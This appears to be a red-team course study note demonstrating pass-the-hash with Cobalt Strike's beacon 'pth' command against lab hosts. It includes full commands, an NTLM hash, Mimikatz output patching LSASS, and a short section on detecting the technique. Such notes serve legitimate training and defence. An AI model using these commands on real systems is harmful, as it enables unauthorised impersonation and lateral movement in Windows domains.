
Pass the hash is a technique that allows you to authenticate to a Windows service using the NTLM hash of a user's password. This means you get to log in or impersonate another user in your local beacon session.  

It works by starting a new logon session with a fake identity and then replacing the session information with the domain, username and NTLM hash provided.

## 🖊️ via [[Cobalt Strike]]

Beacon has a dedicated `pth` command which executes Mimikatz in the background. It requires elevated privileges.

1) Lets say you are currently a local admin but not a domain admin and want to list the contents of an external C drive.

```
beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

2) You won't be able to. Now, using [[Pass the Hash]] you can impersonate another user (which you collected its [[NetNTLM]] hash).

```
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
user	: jking
domain	: DEV
program	: C:\Windows\system32\cmd.exe /c echo 71fb38e2d65 > \\.\pipe\675b08
impers.	: no
NTLM	: 59fc0f884922b4ce376051134c71e22c
  |  PID  1932
  |  TID  6600
  |  LSA Process is now R/W
  |  LUID 0 ; 7479840 (00000000:00722220)
  \_ msv1_0   - data copy @ 000001F6344B3D20 : OK !
  \_ kerberos - data copy @ 000001F6345BD7C8
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001F6344C6128 (32) -> null
```

3) Now you are impersonating (in the same beacon session) another user with other privileges. In this example we get to list the contents since we have jking privs

```
beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
```

4) To "drop" impersonation afterwards, use the `rev2self` command.
```
beacon> rev2self
[*] Tasked beacon to revert token
```


### ⚠ Opsec

Two opportunities to detect PTH are the R/W handle to LSASS; and looking for the `echo foo > \\.\pipe\bar` pattern in command-line logs.



### Properties
---
📆 created   {{11-02-2024}} 20:21
🏷️ tags: #redteam #crto 

---

